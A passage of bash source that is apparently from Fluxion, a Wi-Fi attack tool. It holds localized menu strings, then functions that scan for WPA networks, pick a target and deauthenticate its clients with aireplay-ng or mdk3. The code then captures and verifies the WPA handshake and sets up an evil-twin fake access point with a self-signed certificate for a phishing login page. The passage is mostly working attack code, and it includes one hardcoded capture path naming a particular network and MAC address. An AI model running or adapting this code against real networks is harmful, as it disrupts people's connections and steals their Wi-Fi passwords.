    general_exitmode_3="Disabilito "$grey"l'invio dei pacchetti"
    general_exitmode_4="Pulisco "$grey"iptables"
    general_exitmode_5="Ripristino "$grey"tput"
    general_exitmode_6="Riavvio il "$grey"Network-Manager"
    general_exitmode_7="Pulizia avvenuta con successo!"
    general_exitmode_8="Grazie per aver utilizzato Fluxion"
    #
    selection_1="Dispositivi connessi"
    selection_2="Seleziona Obiettivo. Per effettuare una nuova scansione delle reti premi$red r$transparent"

}

function czech {
	header_setinterface="Vyberte rozhraní"
	setinterface_error="Žádná síťová rozhraní, zavíraní..."

	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_choosescan="Vyberte kanál"
	choosescan_option_1="Všechny kanály"
	choosescan_option_2="Specifický kanál(y)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	scanchan_option_1="Jeden kanál"
	scanchan_option_2="Více kanálů"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scan="Sledování WIFI"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scanchan="Skenování cíle"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askAP="Vyberte metodu útočení"
	askAP_option_1="FakeAP - Hostapd ("$red"Doporučeno)"
	askAP_option_2="FakeAP - airbase-ng (Pomalejší připojení)"
	askAP_option_4="Bruteforce - (Potřebný Handshake)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askauth="METHODA ZÍSKÁNÍ HESLA"
	askauth_option_1="Handshake ("$red"Doporučeno)"
	askauth_option_2="Wpa_supplicant(Více chyb)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthforce="Potvrzení Handshaku"
	deauthforce_option_1="aircrack-ng (Minutí šance)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthMENU="*Nahrát Handshake*"
	deauthMENU_option_1="Zkontrolovat handshake"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_webinterface="Vyberte"
	header_ConnectionRESET="Vyberte přihlašovací stránku"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	general_back="Zpět"
	general_error_1="Nenalezeno"
	general_case_error="Neznámý výběr. Vyberte znovu"
	general_exitmode="Čištění a zavírání"
	general_exitmode_1="Vypínání monitorovacího rozhraní"
	general_exitmode_2="Vypínání rozhraní"
	general_exitmode_3="Vypínání "$grey"směrování packetů"
	general_exitmode_4="Čištění "$grey"iptables"
	general_exitmode_5="Obnovování "$grey"tput"
	general_exitmode_6="Restartování "$grey"Network-Manager"
	general_exitmode_7="Vyčištění proběhlo úspěšně!"
	general_exitmode_8="Děkujeme pro používání programu fluxion"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	selection_1="Aktivní klienti"
	selection_2="Select target. Pro znovuskenování napište$red r$transparent"

}

function greek {
    header_setinterface="Επιλέξτε μία διεπαφή"
    setinterface_error="Δεν υπάρχουν ασύρματες κάρτες δικτύου, έξοδος..."

    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_choosescan="Επίλεξτε κανάλι"
    choosescan_option_1="Όλα τα κανάλια"
    choosescan_option_2="Συγκεκριμένο(α) κανάλι(α)"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    scanchan_option_1="Μονό κανάλι"
    scanchan_option_2="Πολλαπλά κανάλια"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_scan="Εποπτεία Wi-Fi"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_scanchan="Σκανάρισμα στόχου"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_askAP="Επίλογη τύπου επίθεσης"
    askAP_option_1="FakeAP - Hostapd ("$red"Συνιστάται)"
    askAP_option_2="FakeAP - airbase-ng (Πιό αργή σύνδεση)"
    askAP_option_4="Bruteforce - (Απαιτείται το Handshake)"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_askauth="Μέθοδος επαλήθευσης κωδικού πρόσβασης"
    askauth_option_1="Handshake ("$red"Συνιστάται)"
    askauth_option_2="Wpa_supplicant(Περισσότερες αποτυχίες)"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_deauthforce="Επαλήθευση Handshake"
    deauthforce_option_1="aircrack-ng (Πιθανότητα αποτυχίας)"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_deauthMENU="*Λήψη του Handshake*"
    deauthMENU_option_1="Έλεγχος του handshake"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_webinterface="Επίλεξτε την επιλογή σας"
    header_ConnectionRESET="Επίλογη Σελίδας Εισόδου"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    general_back="Πίσω"
    general_error_1="Δέν_βρέθηκε"
    general_case_error="Άγνωστη επιλογή. Επιλέξτε ξανά"
    general_exitmode="Καθαρισμός και τερματισμός"
    general_exitmode_1="Απενεργοποίση εποπτείας περιβάλλοντος"
    general_exitmode_2="Απενεργοποίηση περιβάλλοντος"
    general_exitmode_3="Απενεργοποίηση "$grey"προώθησης των πακέτων"
    general_exitmode_4="Καθαρισμός "$grey"iptables"
    general_exitmode_5="Επαναφορά "$grey"tput"
    general_exitmode_6="Επανεκκίνηση "$grey"του Διαχειριστή δικτύου"
    general_exitmode_7="Ο Καθαρισμός εκτελέστηκε με επιτυχία!"
    general_exitmode_8="Ευχαριστούμε που χρησιμοποιήσατε το fluxion"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    selection_1="Ενεργοί πελάτες"
    selection_2="Επιλέξτε στόχο. Για σκανάρισμα ξανά, πατήστε το$red r$transparent"

}

# Choose Interface
function setinterface {

  conditional_clear
	top
	#unblock interfaces
	rfkill unblock all

	# Collect all interfaces in montitor mode & stop all
	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`

	for monkill in ${KILLMONITOR[@]}; do
		airmon-ng stop $monkill >$flux_output_device
		echo -n "$monkill, "
	done

	# Create a variable with the list of physical network interfaces
	readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
	INTERFACESNUMBER=`./airmon| grep -c "-"`


	if [ "$INTERFACESNUMBER" -gt "0" ]; then

		if [ "$INTERFACESNUMBER" -eq "1" ]; then
			PREWIFI=$(echo ${wirelessifaces[0]} | awk '{print $1}')
		else
			echo $header_setinterface
			echo
			i=0

			for line in "${wirelessifaces[@]}"; do
				i=$(($i+1))
				wirelessifaces[$i]=$line
				echo -e "      "$red"["$yellow"$i"$red"]"$transparent" $line"
			done

			if [ "$FLUX_AUTO" = "1" ];then 
				line="1"
			else 	
				echo
				echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
				read line
			fi

			PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
			 
		fi

		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
			conditional_clear
			top
			setinterface
		fi

		readarray -t naggysoftware < <(./airmon check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
		WIFIDRIVER=$(./airmon | grep "$PREWIFI" | awk '{print($(NF-2))}')

		if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
		rmmod -f "$WIFIDRIVER" &>$flux_output_device 2>&1
		fi

		if [ $KEEP_NETWORK = 0 ]; then

		for nagger in "${naggysoftware[@]}"; do
			killall "$nagger" &>$flux_output_device
		done
		sleep 0.5

		fi

		if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
		modprobe "$WIFIDRIVER" &>$flux_output_device 2>&1
		sleep 0.5
		fi

		# Select Wifi Interface
		select PREWIFI in $INTERFACES; do
			break;
		done

		WIFIMONITOR=$(./airmon start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
		WIFI_MONITOR=$WIFIMONITOR
		WIFI=$PREWIFI

		#No wireless cards
	else

		echo $setinterface_error
		sleep 5
		exitmode
	fi

	deltax
}

function skipme {
	FLUX_DEBUG=1
	Host_SSID="DEV"
	Host_ENC="WPA 2"
	channel="12"
	speed="54"
	Host_MAC="XX:a5:89:ad:e9:XX"
	mac="$Host_MAC"
	Host_MAC_MODEL="XX:a5:89:ad:e9:XX"
	askAP
}

# Check files
function deltax {

	conditional_clear
	CSVDB=dump-01.csv

	rm -rf $DUMP_PATH/*

	choosescan
	selection
}

# Select channel
function choosescan {

	
	if [ "$FLUX_AUTO" = "1" ];then 
		Scan
	else 
	 conditional_clear
		while true; do
			conditional_clear
			top

			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_choosescan"
			echo "                                       "
			echo -e "      "$red"["$yellow"1"$red"]"$transparent" $choosescan_option_1          "
			echo -e "      "$red"["$yellow"2"$red"]"$transparent" $choosescan_option_2       "
			echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back       " $transparent
			echo "                                       "
			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
			read yn
			echo ""
			case $yn in
				1 ) Scan ; break ;;
				2 ) Scanchan ; break ;;
				3 ) setinterface; break;;
				* ) echo "Unknown option. Please choose again"; conditional_clear ;;
			  esac
		done
	fi 
}

# Choose your channel if you choose option 2 before
function Scanchan {

	conditional_clear
	top

	  echo "                                       "
  	  echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_choosescan     "
	  echo "                                       "
	  echo -e "     $scanchan_option_1 "$blue"6"$transparent"               "
	  echo -e "     $scanchan_option_2 "$blue"1-5"$transparent"             "
	  echo -e "     $scanchan_option_2 "$blue"1,2,5-7,11"$transparent"      "
	  echo "                                       "
	echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
	read channel_number
	set -- ${channel_number}
	conditional_clear

	rm -rf $DUMP_PATH/dump*
	xterm $HOLD -title "$header_scanchan [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one
}

# Scans the entire network
function Scan {

	conditional_clear
	rm -rf $DUMP_PATH/dump*

	if [ "$FLUX_AUTO" = "1" ];then
		sleep 30 && killall xterm &
	fi 
	xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
 
}

# Choose a network
function selection {

	conditional_clear
	top


	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`

	if [ "$LINEAS_WIFIS_CSV" = "" ];then
		conditional_clear
		top
		echo -e ""$red"["$yellow"i"$red"]"$transparent" Error: your wireless card  isn't supported  "
		echo -n -e $transparent"Do you want exit? "$red"["$yellow"Y"$transparent"es / "$yellow"N"$transparent"o"$red"]"$transparent":"
		read back
		if [ $back = 'n' ] && [ $back = 'N' ] && [ $back = 'no' ] && [ $back = 'No' ];then
			clear && exitmode

		elif [ $back = 'y' ] && [ $back = 'Y' ] && [ $back = 'yes' ] && [ $back = 'Yes' ];then
			clear && setinterface
		fi

	fi

	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
		deltax && break
	fi

	fluxionap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	fluxionap=`expr $fluxionap - 1`
	head -n $fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
	tail -n +$fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
	echo "                        WIFI LIST "
	echo ""
	echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
	echo ""
	i=0

	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
		longueur=${#MAC}
		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		PRIVACY=${PRIVACY:0:4}
		if [ $longueur -ge 17 ]; then
			i=$(($i+1))
			POWER=`expr $POWER + 100`
			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`

			if [ "$CLIENTE" != "" ]; then
				CLIENTE="*"
			echo -e " "$red"["$yellow"$i"$red"]"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""

			else

			echo -e " "$red"["$yellow"$i"$red"]"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""

			fi

			aidlength=$IDLENGTH
			assid[$i]=$ESSID
			achannel[$i]=$CHANNEL
			amac[$i]=$MAC
			aprivacy[$i]=$PRIVACY
			aspeed[$i]=$SPEED
		fi
	done < $DUMP_PATH/dump-02.csv
		
	# Select the first network if you select the first network 
	if [ "$FLUX_AUTO" = "1" ];then 
		choice=1
	else
		echo
		echo -e ""$blue "("$white"*"$blue") $selection_1"$transparent""
		echo ""
		echo -e "        $selection_2"
		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
		read choice
	fi 

	if [[ $choice -eq "r" ]]; then
		deltax
	fi

	idlength=${aidlength[$choice]}
	ssid=${assid[$choice]}
	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}
	Host_SSID2=`echo $Host_SSID | sed 's/ //g' | sed 's/\[//g;s/\]//g' | sed 's/\://g;s/\://g' | sed 's/\*//g;s/\*//g' | sed 's/(//g' | sed 's/)//g'`
	conditional_clear

	askAP
}


# FakeAP
function askAP {

	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`

	if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
		selection && break
	fi

	if [ "$(echo $WIFIDRIVER | grep 8187)" ]; then
		fakeapmode="airbase-ng"
		askauth
	fi

	if [ "$FLUX_AUTO" = "1" ];then 
	  	fakeapmode="hostapd"; authmode="handshake"; handshakelocation
	else 
		top
		while true; do

			infoap

			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_askAP"
			echo "                                       "
			echo -e "      "$red"["$yellow"1"$red"]"$transparent" $askAP_option_1"
			echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askAP_option_2"
			echo -e "      "$red"["$yellow"3"$red"]"$transparent" $askAP_option_4"
			echo -e "      "$red"["$yellow"4"$red"]"$red" $general_back" $transparent""
			echo "                                       "
			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
			read yn
			echo ""
			case $yn in
				1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
				2 ) fakeapmode="airbase-ng"; askauth; break ;;
				3 ) fakeapmode="WPS-SLAUGHTER"; wps; break ;;
				4 ) fakeapmode="Aircrack-ng"; Bruteforce; break;;
				5 ) selection; break ;;
				* ) echo "$general_case_error"; conditional_clear ;;
			esac
		done
	fi 
}

# Test Passwords / airbase-ng
function askauth {

	if [ "$FLUX_AUTO" = "1" ];then 
		authmode="handshake"; handshakelocation
	else 	
		conditional_clear

		top
		while true; do

			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_askauth"
			echo "                                       "
			echo -e "      "$red"["$yellow"1"$red"]"$transparent" $askauth_option_1"
			echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askauth_option_2"
			echo -e "      "$red"["$yellow"3"$red"]"$transparent" $general_back"
			echo "                                       "
			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
			read yn
			echo ""
			case $yn in
				1 ) authmode="handshake"; handshakelocation; break ;;
				2 ) authmode="wpa_supplicant";  webinterface; break ;;
				3 ) askAP; break ;;
				* ) echo "$general_case_error"; conditional_clear ;;
			esac
		done
	fi 
}

function handshakelocation {

	conditional_clear

	top
	infoap
	if [ -f "/root/handshakes/ALMOXA-F4:CA:E5:DC:DE:78.cap" ]; then
		echo -e "Handshake $yellow$Host_SSID-$Host_MAC.cap$transparent found in /root/handshakes."
		echo -e "${red}Do you want to use this file? (y/N)"
		echo -ne "$transparent"
		
		if [ "$FLUX_AUTO" = "0" ];then 
			read usehandshakefile
		fi 

		if [ "$usehandshakefile" = "y" -o "$usehandshakefile" = "Y" ]; then
			handshakeloc="/root/handshakes/ALMOXA-F4:CA:E5:DC:DE:78.cap"
		certssl
		fi
	fi
	if [ "$handshakeloc" = "" ]; then
		echo
		echo -e "handshake location  (Example: $red$WORK_DIR.cap$transparent)"
		echo -e "Press ${yellow}ENTER$transparent to skip"
		echo
		echo -n "Path: "
		echo -ne "$red"
		echo -ne "$transparent"
	
		if [ "$FLUX_AUTO" = "0" ];then 
			read handshakeloc
		fi 

	fi
		if [ "$handshakeloc" = "" ]; then
			deauthforce
		else
			if [ -f "$handshakeloc" ]; then
				pyrit -r "$handshakeloc" analyze &>$flux_output_device
				pyrit_broken=$?
				
				if [ $pyrit_broken = 0 ]; then
                    		Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
                    		Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
				else
					Host_SSID_loc=$(timeout -s SIGKILL 3 aircrack-ng "$handshakeloc" | grep WPA | grep '1 handshake' | awk '{print $3}')
					Host_MAC_loc=$(timeout -s SIGKILL 3 aircrack-ng "$handshakeloc" | grep WPA | grep '1 handshake' | awk '{print $2}')
				fi


				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
					if [ $pyrit_broken = 0 ] && pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
						certssl
					else
					echo -e $yellow "Corrupted handshake" $transparent
					echo
					sleep 2
					echo "Do you want to try aicrack-ng instead of pyrit to verify the handshake? [ENTER = NO]"
					echo

					read handshakeloc_aircrack
					echo -ne "$transparent"
					if [ "$handshakeloc_aircrack" = "" ]; then
						handshakelocation
					else
						if timeout -s SIGKILL 3 aircrack-ng $handshakeloc | grep -q "1 handshake"; then
							cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
						 	certssl
						else
							echo "Corrupted handshake"
							sleep 2
							handshakelocation
						fi
					fi
					fi
				else
					echo -e "${red}$general_error_1$transparent!"
					echo
					echo -e "File ${red}MAC$transparent"

					readarray -t lista_loc < <(pyrit -r $handshakeloc analyze 2>&1 | grep "^#")
						for i in "${lista_loc[@]}"; do
							echo -e "$green $(echo $i | cut -d " " -f1) $yellow$(echo $i | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')$transparent ($green $(echo $i | cut -d "(" -f2 | cut -d "'" -f2)$transparent)"
						done

					echo -e "Host ${green}MAC$transparent"
					echo -e "$green #1: $yellow$Host_MAC$transparent ($green $Host_SSID$transparent)"
					sleep 7
					handshakelocation
				fi
			else
				echo -e "File ${red}NOT$transparent present"
				sleep 2
				handshakelocation
			fi
		fi
}

function deauthforce {


	if [ "$FLUX_AUTO" = "1" ];then 
		 handshakemode="normal"; askclientsel
	else 

		conditional_clear

		top
		while true; do

			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_deauthforce"
			echo "                                       "
			echo -e "      "$red"["$yellow"1"$red"]"$transparent" $deauthforce_option_1"
			echo -e "      "$red"["$yellow"2"$red"]"$transparent" pyrit"
			echo -e "      "$red"["$yellow"3"$red"]"$transparent" $general_back"
			echo "                                       "
			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
			read yn
			echo ""
			case $yn in
				1 ) handshakemode="normal"; askclientsel; break ;;
				2 ) handshakemode="hard"; askclientsel; break ;;
				3 ) askauth; break ;;
				* ) echo "
		$general_case_error"; conditional_clear ;;
			esac
		done
	fi 
}

############################################### < MENU > ###############################################






############################################# < HANDSHAKE > ############################################

# Type of deauthentication to be performed
function askclientsel {

	if [ "$FLUX_AUTO" = "1" ];then 
		deauth all
	else 
		conditional_clear

		while true; do
			top

			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_deauthMENU"
			echo "                                       "
			echo -e "      "$red"["$yellow"1"$red"]"$transparent" Deauth all"
			echo -e "      "$red"["$yellow"2"$red"]"$transparent" Deauth all [mdk3]"
			echo -e "      "$red"["$yellow"3"$red"]"$transparent" Deauth target "
			echo -e "      "$red"["$yellow"4"$red"]"$transparent" Rescan networks "
			echo -e "      "$red"["$yellow"5"$red"]"$transparent" Exit"
			echo "                                       "
			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
			read yn
			echo ""
			case $yn in
				1 ) deauth all; break ;;
				2 ) deauth mdk3; break ;;
				3 ) deauth esp; break ;;
				4 ) killall airodump-ng &>$flux_output_device; deltax; break;;
				5 ) exitmode; break ;;
				* ) echo "
	$general_case_error"; conditional_clear ;;
			esac
		done
	fi 
}

#
function deauth {

	conditional_clear

	iwconfig $WIFI_MONITOR channel $Host_CHAN

	case $1 in
		all )
			DEAUTH=deauthall
			capture & $DEAUTH
			CSVDB=$Host_MAC-01.csv
		;;
		mdk3 )
			DEAUTH=deauthmdk3
			capture & $DEAUTH &
			CSVDB=$Host_MAC-01.csv
		;;
		esp )
			DEAUTH=deauthesp
			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`


			if [ $LINEAS_CLIENTES -le 5 ]; then
				DEAUTH=deauthall
				capture & $DEAUTH
				CSVDB=$Host_MAC-01.csv
				deauth

			fi

			capture
			for CLIENT in $HOST; do
				Client_MAC=`echo ${CLIENT:0:17}`
				deauthesp
			done
			$DEAUTH
			CSVDB=$Host_MAC-01.csv
		;;
	esac


	deauthMENU

}

function deauthMENU {

	if [ "$FLUX_AUTO" = "1" ];then 
		while true;do 
			checkhandshake && sleep 5
		done
	else 

		while true; do
			conditional_clear

			clear
			top

			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_deauthMENU "
			echo
			echo -e "Status handshake: $Handshake_statuscheck"
			echo
			echo -e "      "$red"["$yellow"1"$red"]"$transparent" $deauthMENU_option_1"
			echo -e "      "$red"["$yellow"2"$red"]"$transparent" $general_back (Select another deauth method)"
			echo -e "      "$red"["$yellow"3"$red"]"$transparent" Select another network"
			echo -e "      "$red"["$yellow"4"$red"]"$transparent" Exit"
			echo -n '      #> '
			read yn

			case $yn in
				1 ) checkhandshake;;
				2 ) conditional_clear; killall xterm; askclientsel; break;;
				3 ) killall airodump-ng mdk3 aireplay-ng xterm &>$flux_output_device; CSVDB=dump-01.csv; breakmode=1; killall xterm; selection; break ;;
				4 ) exitmode; break;;
				* ) echo "
	$general_case_error"; conditional_clear ;;
			esac

		done
	fi 
}

# Capture all
function capture {

	conditional_clear
	if ! ps -A | grep -q airodump-ng; then

		rm -rf $DUMP_PATH/$Host_MAC*
		xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng  --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR --ignore-negative-one &
	fi
}

# Check the handshake before continuing
function checkhandshake {

	if [ "$handshakemode" = "normal" ]; then
		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
			wpaclean $HANDSHAKE_PATH/$Host_SSID2-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$flux_output_device
			certssl
			i=2
			break

		else
			Handshake_statuscheck="${red}Not_Found$transparent"

		fi
	elif [ "$handshakemode" = "hard" ]; then
		pyrit -r $DUMP_PATH/$Host_MAC-01.cap -o $DUMP_PATH/test.cap stripLive &>$flux_output_device

		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
			pyrit -r $DUMP_PATH/test.cap -o $HANDSHAKE_PATH/$Host_SSID2-$Host_MAC.cap strip &>$flux_output_device
			certssl
			i=2
			break

		else
			if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
				Handshake_statuscheck="${yellow}Corrupted$transparent"
			else
				Handshake_statuscheck="${red}Not_found$transparent"

			fi
		fi

		rm $DUMP_PATH/test.cap &>$flux_output_device
	fi

}

############################################# < HANDSHAKE > ############################################

function certssl {

# Test if the ssl certificate is generated correcly if there is any
 
	if [ -f $DUMP_PATH/server.pem ]; then
		if [ -s $DUMP_PATH/server.pem ]; then
			webinterface
			break
		else

			if [ "$FLUX_AUTO" = "1" ];then 
				creassl
			fi
			while true;do 
			conditional_clear
			top
			echo "                                       "
			echo -e ""$red"["$yellow"i"$red"]"$transparent" Certificate invalid or not present, please choose an option"
			echo "                                       "
			echo -e "      "$red"["$yellow"1"$red"]"$transparent" Create a SSL certificate"
			echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSL certificate" # hop to certssl check again
			echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
			echo " "
			echo -n '      #> '
			read yn

			case $yn in
				1 ) creassl;;
				2 ) certssl;break;;
				3 ) exitmode; break;;
				* ) echo "$general_case_error"; conditional_clear
			esac
			done 
		 fi
	else
			if [ "$FLUX_AUTO" = "1" ];then 
				creassl
			fi

			while true; do
			conditional_clear
			top
			echo "                                    	                            "
			echo "  Certificate invalid or not present, please choice"
			echo "                                       "
			echo -e "      "$red"["$yellow"1"$red"]"$transparent" Create  a SSL certificate"
			echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSl certificate" # hop to certssl check again
			echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
			echo " "
			echo -n '      #> '
			read yn

			case $yn in
				1 ) creassl;;
				2 ) certssl; break;;
				3 ) exitmode; break;;
				* ) echo "$general_case_error"; conditional_clear
			esac
		done
	fi 
	


}

# Create Self-Signed SSL Certificate
function creassl {
	xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /$DUMP_PATH/server.pem -out /$DUMP_PATH/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
	certssl
}

############################################# < ATAQUE > ############################################

# Select attack strategie that will be used
function webinterface {


	chmod 400 /root/server.pem

	if [ "$FLUX_AUTO" = "1" ];then 
		matartodo; ConnectionRESET; selection
	else 
		while true; do
			conditional_clear
			top

			infoap
			echo
			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_webinterface"
			echo
